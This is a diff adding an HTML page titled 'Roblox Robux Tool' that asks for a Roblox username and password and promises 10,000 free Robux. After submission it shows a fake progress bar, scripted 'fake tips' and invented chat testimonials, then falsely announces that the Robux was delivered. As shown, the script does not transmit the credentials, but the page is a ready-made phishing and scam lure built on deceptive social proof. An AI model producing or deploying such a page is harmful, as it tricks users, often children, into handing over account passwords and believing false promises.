@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Roblox Generator</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap');
+
+    /* Roblox font-like style - Roboto is close enough */
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #1b1b1b;
+      color: #ffffff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      min-height: 100vh;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+
+    header {
+      background-color: #202020;
+      width: 100%;
+      padding: 20px 0;
+      text-align: center;
+      font-size: 2.4rem;
+      font-weight: 700;
+      color: #f44336; /* Roblox red */
+      letter-spacing: 2px;
+      border-bottom: 4px solid #f44336;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);
+      position: relative;
+    }
+
+    /* Robux icon in header */
+    header::after {
+      content: url('https://cdn.iconscout.com/icon/free/png-256/robux-2824197-2341560.png');
+      width: 32px;
+      height: 32px;
+      position: absolute;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      filter: drop-shadow(0 0 1px #f44336);
+    }
+
+    main {
+      background: #2a2a2a;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.6);
+      width: 420px;
+      max-width: 90vw;
+      text-align: center;
+      position: relative;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      margin-top: 20px;
+      position: relative;
+    }
+
+    label {
+      text-align: left;
+      font-weight: 600;
+      margin-bottom: 6px;
+      font-size: 1.1rem;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      border-radius: 6px;
+      border: none;
+      font-size: 1rem;
+      background: #424242;
+      color: #fff;
+      padding-left: 50px; /* For avatar space */
+      position: relative;
+    }
+
+    input[type="text"]::placeholder,
+    input[type="password"]::placeholder {
+      color: #bbb;
+    }
+
+    /* Roblox avatar next to username input */
+    #avatar {
+      position: absolute;
+      left: 10px;
+      top: 60px; /* aligned with username input */
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      border: 2px solid #f44336;
+      object-fit: cover;
+      pointer-events: none;
+    }
+
+    button {
+      padding: 14px;
+      background-color: #f44336; /* Roblox red */
+      border: none;
+      border-radius: 6px;
+      font-weight: 700;
+      font-size: 1.2rem;
+      color: white;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #d32f2f;
+    }
+
+    /* Progress bar */
+    #progressBarContainer {
+      display: none;
+      margin-top: 30px;
+      background-color: #3a3a3a;
+      border-radius: 8px;
+      overflow: hidden;
+      height: 25px;
+      width: 100%;
+    }
+
+    #progressBar {
+      height: 100%;
+      width: 0%;
+      background-color: #4caf50;
+      transition: width 0.2s ease-in-out;
+    }
+
+    #loading-message {
+      margin-top: 15px;
+      font-size: 1rem;
+      color: #ffeb3b;
+    }
+
+    #success-message {
+      display: none;
+      margin-top: 30px;
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: #4caf50;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    /* Robux icon in success message */
+    #success-message img {
+      width: 36px;
+      height: 36px;
+    }
+
+    /* Chat box */
+    #chatBox {
+      display: none;
+      margin-top: 30px;
+      max-height: 200px;
+      overflow-y: auto;
+      background: #1e1e1e;
+      padding: 15px;
+      border-radius: 10px;
+      text-align: left;
+      font-size: 0.9rem;
+      line-height: 1.4;
+      border: 1px solid #444;
+      color: #00e676;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    .chat-msg {
+      margin-bottom: 10px;
+    }
+
+    .chat-msg span {
+      font-weight: bold;
+      color: #00e676;
+      font-family: monospace;
+    }
+
+    /* Likes badge */
+    #likesBadge {
+      margin-top: 15px;
+      background-color: #0652dd; /* Roblox blue */
+      color: white;
+      font-weight: 700;
+      padding: 8px 15px;
+      border-radius: 20px;
+      font-size: 1rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      user-select: none;
+      box-shadow: 0 0 8px #0652ddaa;
+    }
+
+    #likesBadge img {
+      width: 20px;
+      height: 20px;
+    }
+  </style>
+</head>
+<body>
+  <header>ROBLOX ROBUX TOOL</header>
+  <main>
+    <form id="robuxForm">
+      <label for="username">Roblox Username</label>
+      <input type="text" id="username" name="username" required placeholder="Enter your username" autocomplete="off" />
+
+      <!-- Roblox avatar placeholder -->
+      <img id="avatar" src="https://www.roblox.com/headshot-thumbnail/image?userId=1&width=48&height=48&format=png" alt="Avatar" />
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required placeholder="Enter your password" autocomplete="off" />
+
+      <button type="submit">Claim Robux</button>
+    </form>
+
+    <!-- Likes badge below the form -->
+    <div id="likesBadge">
+      <img src="https://cdn.iconscout.com/icon/free/png-256/thumb-up-56-461887.png" alt="Likes" />
+      1M+ Likes
+    </div>
+
+    <div id="progressBarContainer">
+      <div id="progressBar"></div>
+    </div>
+    <div id="loading-message"></div>
+
+    <div id="success-message">
+      <img src="https://cdn.iconscout.com/icon/free/png-256/robux-2824197-2341560.png" alt="Robux" />
+      🎉 10,000 Robux has been delivered to your account! 🎉
+    </div>
+
+    <div id="chatBox"></div>
+  </main>
+
+  <script>
+    const form = document.getElementById('robuxForm');
+    const progressBarContainer = document.getElementById('progressBarContainer');
+    const progressBar = document.getElementById('progressBar');
+    const loadingMessage = document.getElementById('loading-message');
+    const successMessage = document.getElementById('success-message');
+    const chatBox = document.getElementById('chatBox');
+    const avatar = document.getElementById('avatar');
+    const usernameInput = document.getElementById('username');
+
+    const fakeTips = [
+      "If you don’t get 10k Robux, try again later.",
+      "Your internet connection might be slow.",
+      "Browser may be restricted in your region.",
+      "Please be patient while we verify your request.",
+      "Trying different servers..."
+    ];
+
+    const fakeChatMessages = [
+      "🌟 <span>User123</span>: I got 10K Robux! Thanks!!",
+      "🎉 <span>RobloxFan44</span>: Omg it worked!",
+      "🔥 <span>GamerXD</span>: Can't believe I finally got it!",
+      "✅ <span>YeetMaster</span>: This is legit, thx!",
+      "💰 <span>RbxKing</span>: It really worked for me too!",
+      "🤩 <span>NoobSlayer</span>: So happy right now!",
+      "🙌 <span>VictoryRoyale</span>: 10,000 Robux just arrived!",
+      "🎮 <span>GGPro</span>: Big thanks!"
+    ];
+
+    // Update avatar based on username input (using Roblox API for user headshot)
+    usernameInput.addEventListener('input', () => {
+      const username = usernameInput.value.trim();
+      if (!username) {
+        avatar.src = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=48&height=48&format=png";
+        return;
+      }
+
+      // Roblox API to get userId by username (requires web fetch)
+      // Since Roblox has CORS, this won't work directly here without a proxy,
+      // so let's fake it by just using a random userId for demo purposes
+
+      // In a real app, you'd do an API call or proxy, but here we fake:
+      const fakeUserId = Math.floor(Math.random() * 1000000);
+      avatar.src = `https://www.roblox.com/headshot-thumbnail/image?userId=${fakeUserId}&width=48&height=48&format=png`;
+    });
+
+    function showFakeChats() {
+      chatBox.innerHTML = '';
+      fakeChatMessages.forEach((msg, index) => {
+        setTimeout(() => {
+          const p = document.createElement('div');
+          p.className = 'chat-msg';
+          p.innerHTML = msg;
+          chatBox.appendChild(p);
+          chatBox.scrollTop = chatBox.scrollHeight;
+        }, 1000 + index * 1000);
+      });
+    }
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      form.style.display = 'none';
+      progressBarContainer.style.display = 'block';
+      chatBox.style.display = 'block';
+
+      loadingMessage.style.display = 'block';
+      successMessage.style.display = 'none';
+
+      let width = 0;
+      let messageIndex = 0;
+
+      const interval = setInterval(() => {
+        if (width >= 100) {
+          clearInterval(interval);
+          progressBarContainer.style.display = 'none';
+          loadingMessage.style.display = 'none';
+          successMessage.style.display = 'flex';
+        } else {
+          width += 2;
+          progressBar.style.width = width + '%';
+
+          if (width % 20 === 0 && messageIndex < fakeTips.length) {
+            loadingMessage.textContent = fakeTips[messageIndex++];
+          }
+        }
+      }, 300);
+
+      showFakeChats();
+    });
+  </script>
+</body>
+</html>
